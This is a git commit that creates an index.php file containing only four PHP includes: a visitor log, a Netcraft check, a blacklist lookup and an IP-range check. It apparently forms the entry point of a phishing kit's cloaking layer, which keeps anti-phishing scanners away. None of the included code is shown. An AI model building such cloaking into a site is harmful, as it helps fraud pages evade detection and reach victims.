a70f953a7bf1e0ff667bfca5f71ba3416602ea41
jnjnjnjn4567 <63479587+jnjnjnjn4567@users.noreply.github.com>
2020-04-11 17:24:02 +0100

    Create index.php

---
+++ index.php
@@ -0,0 +1,6 @@
+<?php
+require "assets/includes/visitor_log.php";
+require "assets/includes/netcraft_check.php";
+require "assets/includes/blacklist_lookup.php";
+require "assets/includes/ip_range_check.php";
+?>
